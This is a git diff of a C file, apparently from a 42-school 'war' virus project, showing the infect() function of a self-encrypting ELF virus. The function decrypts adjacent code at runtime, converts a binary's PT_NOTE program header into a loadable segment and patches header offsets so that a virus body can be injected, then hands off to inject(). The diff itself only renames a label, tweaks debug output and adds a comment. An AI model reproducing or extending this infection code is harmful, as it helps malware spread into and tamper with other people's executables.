@@ -6,24 +6,27 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:22:03 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/04 11:50:19 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/08 15:48:22 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "war.h"
 
+/*
+  Infect modify binary header and segment. it transform PT_NOTE into PT_LOAD
+*/
 void		infect(t_data *data)
 {
 	revert_two(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect);
 
 #ifdef DEBUG
-	char de[] = "infect\t \n";
-	data->context == true ?	de[7] = 49 : 48;
+	char de[] = "infect\t0\n";
+	data->context == true ?	de[7] = 49 : 0;
 	_write(1, de, _strlen(de));
 #endif
 
 	if (data->context == false)
-		goto ERR;
+		goto next;
 
 	data->context = false;
 	Elf64_Phdr  *tmp = NULL;
@@ -31,7 +34,7 @@ void		infect(t_data *data)
 	{
 		tmp = (Elf64_Phdr*)((char*)data->bin.map + (data->header->e_phoff + sizeof(Elf64_Phdr) * off));
 		if (!tmp || (void*)tmp >= (void*)data->bin.map + data->bin.size)
-			goto ERR;
+			goto next;
 		if (tmp->p_type == PT_NOTE)
 			data->virus.note = tmp;
 		if ((tmp->p_type == PT_LOAD) && (tmp->p_flags == (PF_W | PF_R)))
@@ -39,7 +42,7 @@ void		infect(t_data *data)
 	}
 
 	if (data->virus.note == NULL || data->virus.data == NULL)
-		goto ERR;
+		goto next;
 
 	size_t base = data->virus.data->p_vaddr + data->virus.data->p_memsz;
 	size_t padd = base % data->virus.data->p_align;
@@ -61,10 +64,8 @@ void		infect(t_data *data)
 	data->header->e_shoff += data->virus.size + (data->virus.note->p_offset - (data->virus.data->p_offset + data->virus.data->p_filesz));
 	data->context = true;
 
-ERR:
-
+next:
 	update_two(&data->key, (char*)infect, (size_t)inject - (size_t)infect);
-	revert_two(&data->key, (char*)inject, (size_t)release - (size_t)inject);
-
+	revert_two(&data->key, (char*)inject, (size_t)patch - (size_t)inject);
 	inject(data);
 }
